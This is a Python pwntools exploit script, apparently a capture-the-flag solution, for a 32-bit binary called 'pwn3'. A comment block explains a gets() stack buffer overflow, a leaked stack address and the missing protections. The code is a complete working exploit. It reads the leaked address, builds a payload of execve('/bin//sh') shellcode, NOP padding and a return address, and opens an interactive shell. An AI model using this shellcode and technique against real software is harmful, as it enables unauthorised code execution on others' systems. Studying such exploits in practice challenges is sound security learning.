#!/usr/bin/python3
'''
run checksec on the binary
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
so we see that this is a 32-bit binary with ASLR turned on.
However, when the program runs, it leaked the mem address of some variable -> look deeper on this.
Ghidra shows that the leaked address is actually belongs to a local variable that we want to overflow.
main function calls echo function:
    -------------------------
    void echo(void)

    {
      char local_12e [294];
      
      printf("Take this, you might need it on your journey %p!\n",local_12e);
      gets(local_12e);
      return;
    }
    -------------------------
gets() has no size check, local var has size of 294 bytes, offset between local var and eip is 0x12e.
what to do: grab the leaked mem address at run time, the offset should be always the same even with ASLR, overflow local variable, overwrite eip,
inject a shellcode.

'''
import pwn as p

def pwn():
    start = p.process('./pwn3')
    
    line1 = start.recvline()
    varAddr = line1[45:-2] # <- get local mem addr at runtime
    strAddr = varAddr.decode('utf8')

    # Craft payload
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' # 23 bytes
    padding = (0x12e - len(shellcode))
    payload = shellcode + b'\x90'*padding + p.p32(int(strAddr, 16))

    # Send payload
    start.sendline(payload)
    start.interactive()

if __name__ == "__main__":
    pwn()
